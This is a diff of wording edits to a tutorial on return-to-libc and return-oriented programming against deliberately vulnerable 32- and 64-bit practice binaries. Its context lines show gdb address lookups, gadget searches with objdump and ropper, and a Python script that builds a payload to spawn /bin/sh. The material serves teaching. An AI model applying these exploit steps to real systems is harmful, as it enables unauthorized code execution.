@@ -85,7 +85,7 @@ low addresses
 
 The buffer is filled, and the saved frame pointer is overwritten by junk. ret will have the address of `system()`, making this the next function returned to. When `system()` executes, it will take the address of the '/bin/sh' string from the stack and execute it. Afterwards it will return to our specified address. We will use the address of `exit()`, since it allows us a clean exit (we could of course use some garbage value as the return address if we wanted the program to crash).
 
-Open the program in gdb. Disassembling main reveals the number of bytes from the start of the buffer to the saved frame pointer:
+Open the program in gdb. Disassembling `main` reveals the number of bytes from the start of the buffer to the saved frame pointer:
 
 ```
 (gdb) disas main
@@ -101,14 +101,14 @@ Open the program in gdb. Disassembling main reveals the number of bytes from the
 
 So we need to fill the buffer with 33 bytes, and then 4 bytes to overwrite the saved frame pointer (remember that we are exploiting a 32-bit binary which has 4 byte addresses).
 
-To find the address of `system()` you look at its disassembly using `disas system` in gdb, or more simply do:
+To find the address of `system()`, we look at its disassembly using `disas system` in gdb, or more simply do:
 
 ```bash
 (gdb) print system
 $1 = {<text variable, no debug info>} 0xf7e464d0 <system>
 ```
 
-> You need to run the program in gdb first so that it will load the shared library.
+> We need to run the program in gdb first so that it will load the shared library.
 
 Then do the same for `exit()`:
 
@@ -117,7 +117,7 @@ Then do the same for `exit()`:
 $2 = {<text variable, no debug info>} 0xf7e38500 <exit>
 ```
 
-The address contains a null byte. We can't use it, but looking at the code around exit, we can use the address right before since it's just a nop instruction:
+The address contains a null byte. We can't use it, but looking at the code around exit, we see that the address right before is usable since it's just a nop instruction:
 
 ```bash
 (gdb) x/5i *exit-1
@@ -140,7 +140,7 @@ $ env - MYSH=/bin/sh gdb r2l1
 0xffffdfbd:     "MYSH=/bin/sh"
 ```
 
-> libc actually contains a "/bin/sh" string, so we don't really need to supply the environment variable. You can verify this by using `strings /usr/lib/libc.so.6` from the terminal. You can find the address of this string in gdb by using `find &`*function*`,+9999999,"/bin/sh"`, where *function* is a libc function (e.g. `exit()`, `system()` or `printf()`).
+> libc actually contains a "/bin/sh" string, so we don't really need to supply the environment variable. We can verify this by using `strings /usr/lib/libc.so.6` from the terminal. We can find the address of this string in gdb by using `find &`*function*`,+9999999,"/bin/sh"`, where *function* is a libc function (e.g. `exit()`, `system()` or `printf()`).
 
 > TIP: The enviroment contains a `SHELL` variable, but this is of course unavailable when we run with an empty environment, but it may be useful to know about for another time.
 
@@ -184,7 +184,7 @@ Input something: The first character was: A
 
 > <() is process substitution.
 
-The blinking cursor now waits for our input. But how can we be sure this is the sh spawned from `r2l1`?
+The blinking cursor now waits for our input. But how can we be sure this is the `sh` spawned from `r2l1`?
 
 ```
 Input something: The first character was: A
@@ -203,13 +203,13 @@ We use `echo $$` to get the pid of the shell, then suspend the job to get back t
 
 ## Intro to 64-bit ROP
 
-The reason we started looking at ROP with a 32-bit program is, as stated, that it's simpler. If we were to do the same exploit as above on 64-bit, we immediately encounter an obstacle: 32-bit programs use the stack to pass function arguments, while 64-bit programs use registers How do we get the required function arguments into the correct regiters (like the address of "/bin/sh" to `system()` in `%rdi`) when we can only write to the stack?
+The reason we started looking at ROP with a 32-bit program is, as stated, that it's simpler. If we were to do the same exploit as above on 64-bit, we immediately encounter an obstacle: 32-bit programs use the stack to pass function arguments, while 64-bit programs use registers. How do we get the required function arguments into the correct registers (like the address of "/bin/sh" to `system()` in `%rdi`) when we can only write to the stack?
 
-This is where return-oriented programmed reveals itself as a huge subject of vast possibilities. Not only can we get any value we want into any register, we have access to Turing complete functionality.
+This is where return-oriented programmed reveals itself as a huge subject of vast possibilities. Not only can we get any value we want into any register, we have access to Turing-complete functionality.
 
 Return-oriented programming is more than using using shared library functions to serve our needs. We can chain together pieces of program code and shared library code to accomplish any goal.
 
-Let's start with showing how a simple return-to-libc attack is done. The program code below is exactly the same as in the previous section, but is compiled for 64-bit.
+Let's start with showing how a simple return-to-libc attack is done. The program code below is exactly the same as in the previous section, but compiled for 64-bit.
 
 ```c
 /*
@@ -238,7 +238,7 @@ int main(int argc, char *argv[])
 
 To successfully exploit the above program and get a shell with the `system()` function, we need to find a way to put the address of "/bin/sh" in the `%rdi` register before returning to `system()`.
 
-In order to acheive this, we can search for instructions that pops from the stack into %rdi (since `%rdi` is where `system()` expects its argument) and then returns (or does something else that doesn't interfere with what we want to do, then returns). If we can't find an instruction like this, we can for example find and instruction that pops into some register and returns, then another that moves data from that register to `%rdi`, then returns.
+In order to acheive this, we can search for instructions that pops from the stack into `%rdi` (since `%rdi` is where `system()` expects its argument) and then returns (or does something else that doesn't interfere with what we want to do, then returns). If we can't find an instruction like this, we can for example find and instruction that pops into some register and returns, then another that moves data from that register to `%rdi`, then returns.
 
 > These small chunks of instructions ending in `ret` (or similar) are called *gadgets*.
 
@@ -259,7 +259,7 @@ $ objdump -d r2l2 | grep '%[r,e]di'
    4011e6:       44 89 ef                mov    %r13d,%edi
 ```
 
-> We will look at better and more efficient ways of looking for ROP-gadgets later on.
+> We will look at better and more efficient ways of discovering ROP-gadgets later on.
 
 The last instruction moves data to `%edi` from `%r13d`, but there are function calls, a jump and a bunch of other instructions before `ret`:
 
@@ -324,7 +324,7 @@ The little gadget at 0x40111d that pops into `%rbp` and returns could be of use.
 
 Instead of manually searching for gadgets, we can use a tool called `ropper`.
 
-`ropper` is very useful for finding ROP gadgets (and much more). It can be installed by doing:
+`ropper` is very useful for finding ROP gadgets. It can be installed by doing:
 
 ```c
 $ virutalenv ropper
@@ -371,7 +371,7 @@ We will call this gadget to pop the address of a "/bin/sh" string into `%rdi`, t
 
 If we use `disas cp` in gdb, we see that the buffer starts at -0x20(%rbp). We need to fill the buffer, overwrite the saved frame pointer and overwrite ret with the address of our gadget. Our gadget pops from the top of the stack, so we need to put the address of the "/bin/sh" string after ret. At this point we could encounter a major obstacle since we are going to write addresses containing null bytes to the stack. Luckily, `scanf` does not mind null bytes (unlike e.g. `strcpy`), so this is not a problem.
 
-> We later look at how 0-byte addresses can be handled when the vulnerable program uses a function that stops writing at the first null byte (like `strcpy`).
+> We later look at how addresses with null bytes can be handled when the vulnerable program uses a function that stops writing at the first null byte (like `strcpy`).
 
 Now, we can find the address of "/bin/sh", `system()` and `exit()`.
 
@@ -476,7 +476,7 @@ Let's confirm that the address of the string is in `rdi` and continue:
 => 0x7ffff7e2ec30 <system>:     endbr64
 ```
 
-We are now in `system()`! We will continue to see if a shell pops.
+We are now in `system()`. We will continue to see if a shell pops.
 
 ```bash
 (gdb) c
@@ -502,7 +502,7 @@ bash(11617)─┬─bash(12776)───cat(12780)
 
 We got a shell!
 
-As a final exercise, we'll fix the exit code. As you may have noticed in the gdb output above, the program exits with exit code 2:
+As a final exercise, we'll fix the exit code. As we saw in the gdb output above, the program exits with exit code 2:
 
 ```
 $ (cat pl.bin; cat) | ./r2l2
@@ -514,7 +514,7 @@ $ echo $?
 
 > The `%rdi` register is changed to 0x2 by a function called by `system()`. The `%rdi` register is *volatile* (not preserved acrosss function calls).
 
-We need to find a gadget that we can run before `exit()` that will put zero into `%rdi`. Luckily, we already have a gadget like this, our old pal `pop %rdi; ret`. By putting its address and 8 null bytes before the address of `exit()`, we can accomplish our goal:
+We need to find a gadget that we can run before `exit()` that will put zero into `%rdi`. Luckily, we already have a gadget like this: `pop %rdi; ret`. By putting its address and 8 null bytes before the address of `exit()`, we can accomplish our goal:
 
 ```python
 # r2l2_exploit.py
@@ -534,7 +534,7 @@ print pad + poprdi + binsh + csystem + poprdi + ecode + cexit
 
 > The above exploit is more readable and easier to modify than a long oneliner. The `struct.pack("<Q", ...)` let's us type in addresses without leading zeroes and have them returned as a string packed to a little-endian unsigned long long (8 bytes).
 
-You can run the above exploit like this in gdb (if you for example want to study the stack and register states):
+we can run the above exploit like this in gdb (if we for example want to study the stack and register states):
 
 ```bash
 (gdb) r < <(python r2l2_exploit.py)
